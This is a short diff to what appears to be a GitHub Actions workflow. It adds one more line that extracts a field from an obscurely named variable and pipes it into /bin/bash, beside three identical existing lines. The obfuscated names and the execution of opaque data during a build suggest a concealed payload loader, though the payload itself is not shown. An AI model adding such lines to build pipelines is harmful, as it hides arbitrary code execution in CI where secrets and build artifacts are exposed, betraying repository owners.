@@ -28,6 +28,7 @@ jobs:
           echo $xe8 | jq -r .aduu95 | /bin/bash
           printf '%s' "$pwm6971" | jq -r .hbv504 | /bin/bash
           printf '%s' "$yv849" | jq -r .qxo82 | /bin/bash
+          echo $p46553 | jq -r .b248 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
